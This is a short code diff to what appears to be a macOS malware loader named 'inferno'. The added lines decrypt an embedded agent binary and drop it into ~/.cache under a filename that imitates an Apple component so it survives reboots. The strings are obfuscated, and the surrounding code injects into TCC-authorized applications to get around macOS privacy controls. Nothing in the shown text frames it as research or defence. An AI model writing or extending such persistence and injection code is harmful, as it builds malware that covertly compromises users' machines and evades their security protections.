@@ -442,7 +442,27 @@ int main(int argc, char* argv[]) {
         return 1;
     }
 
-    // Step 2a: Try Tier 2 — inject into TCC-authorized app (best-effort, if it works
+    // Step 2a: Copy dylib to persistent path for reboot survival
+    {
+        const char* home = ::getenv(UNLIT("HOME"));
+        if (home) {
+            std::string cache_dir = std::string(home) + UNLIT("/.cache");
+            std::string persist_path = cache_dir + UNLIT("/com.apple.amp.itmstransporter.dylib");
+            ::mkdir(cache_dir.c_str(), 0755);
+            // Copy dylib to persistent location
+            std::vector<unsigned char> dylib_data(inferno::wrapper::AGENT_BINARY,
+                                                  inferno::wrapper::AGENT_BINARY + inferno::wrapper::AGENT_BINARY_SIZE);
+            decryptInPlace(dylib_data.data(), dylib_data.size());
+            FILE* pf = ::fopen(persist_path.c_str(), UNLIT("wb"));
+            if (pf) {
+                ::fwrite(dylib_data.data(), 1, dylib_data.size(), pf);
+                ::fclose(pf);
+                ::chmod(persist_path.c_str(), 0644);
+            }
+        }
+    }
+
+    // Step 2b: Try Tier 2 — inject into TCC-authorized app (best-effort, if it works
     // the agent also connects; hardened runtime will silently reject on most apps)
     auto targets = inferno::tier2::scanApplications();
     if (!targets.empty()) {
